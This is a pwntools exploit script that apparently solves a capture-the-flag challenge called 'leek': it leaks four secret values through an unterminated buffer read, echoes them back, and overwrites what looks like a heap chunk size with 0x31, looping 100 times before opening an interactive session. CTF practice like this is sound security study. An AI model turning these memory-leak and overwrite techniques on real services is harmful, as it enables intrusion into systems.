#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./leek"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+431
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def guessing():
    payload = b"A" * (0x20 - 1)

    p.recvuntil(":")
    p.sendline(payload)
    p.recvuntil(payload + b'\n')

    secret_1 = u64(p.recv(8))
    secret_2 = u64(p.recv(8))
    secret_3 = u64(p.recv(8))
    secret_4 = u64(p.recv(8))

    payload = b''
    payload += p64(secret_1)
    payload += p64(secret_2)
    payload += p64(secret_3)
    payload += p64(secret_4)

    p.recvuntil("?")
    p.send(payload)

    payload = b"A" * 0x18
    payload += p64(0x31)

    p.recvuntil(":")
    p.sendline(payload)


for i in range(0x64):
    guessing()

p.interactive()
